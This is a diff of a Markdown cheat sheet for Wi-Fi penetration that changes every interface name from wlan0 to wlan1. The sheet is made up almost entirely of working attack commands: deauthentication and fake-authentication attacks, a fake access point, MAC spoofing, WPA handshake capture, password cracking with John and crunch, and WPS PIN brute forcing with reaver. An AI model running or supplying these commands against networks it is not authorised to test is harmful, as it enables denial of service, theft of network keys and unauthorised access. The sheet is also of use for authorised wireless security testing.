@@ -46,54 +46,54 @@ systemctl status NetworkManager
 
 > ### Enable Monitor Mode
 ```bash
-airmon-ng start wlan0
+airmon-ng start wlan1
 ```
 
 > ### Disable Monitor Mode
 ```bash
-airmon-ng stop wlan0
+airmon-ng stop wlan1
 ```
 
 > ### Packet Injection test
 ```bash
-aireplay-ng --test wlan0
+aireplay-ng --test wlan1
 ```
 
 > ### Access Point Creation test
 
 you can put any fake MAC Address like this `00:01:02:03:04:05`
 ```bash
-airbase-ng -a 00:01:02:03:04:05 --essid "<AP_name>" -c {channel_no.} wlan0
+airbase-ng -a 00:01:02:03:04:05 --essid "<AP_name>" -c {channel_no.} wlan1
 ```
 
 ---
 
 # Changing MAC Address
 ```bash
-ifconfig wlan0 down
-ifconfig wlan0 hw ether 00:11:22:33:44:55
-ifconfig wlan0 up
+ifconfig wlan1 down
+ifconfig wlan1 hw ether 00:11:22:33:44:55
+ifconfig wlan1 up
 ```
 # Sniff Network 
 
 > ### Sniff Network around `2.4 GHz`
 ```bash
-airodump-ng wlan0
+airodump-ng wlan1
 ```
 
 > ### Sniff Network Both `2.4 GHz and 5 GHz`
 ```bash
-airodump-ng --band a wlan0
+airodump-ng --band a wlan1
 ```
 
 > ### Capture data both `2.4 GHz and 5 GHz`
 ```bash
-airodump-ng --band abg wlan0
+airodump-ng --band abg wlan1
 ```
 ---
 # Capture Data
 ```bash
-airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan0
+airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan1
 ```
 # Analyse Data
 ```bash
@@ -108,22 +108,22 @@ aireplay-ng --fakeauth 0 -a {router_MAC_add} -h {Your_NIC_MAC_add} waln1
 
 # DE-Authentication Attack
 ```bash
-aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan0
+aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan1
 ```
 if it`s fails then, target router on specfic channel
 
 ```bash
-airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan0
+airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan1
 ```
 
 # Fake-Authentication Attack
 ```bash
-aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan0
+aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan1
 ```
 
 # WPA Handshake Capture
 ```bash
-airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan0
+airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan1
 ```
 
 # Password Cracking Using `John`
@@ -164,7 +164,7 @@ crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@
 > ## Scan WPS Enable Network Around us
 
 ```sh
-wash --interface wlan0
+wash --interface wlan1
 ```
 
 >[!WARNING]
@@ -172,7 +172,7 @@ wash --interface wlan0
 
 > ## Brute force the pin attack
 ```sh
-reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan0 -vvv --no-associate 
+reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan1 -vvv --no-associate 
 ```
 ---
 ---
@@ -209,13 +209,13 @@ sudo systemctl stop wpa_supplicant.service
 ```
 
 ```sh
-sudo ip link set wlan0 down
-sudo iw dev wlan0 set type monitor
-sudo ip link set wlan0 u
+sudo ip link set wlan1 down
+sudo iw dev wlan1 set type monitor
+sudo ip link set wlan1 u
 ```
 
 ```sh
-sudo hcxdumptool -i wlan0 -w dumpfile.pcapng
+sudo hcxdumptool -i wlan1 -w dumpfile.pcapng
 ```
 
 ```sh
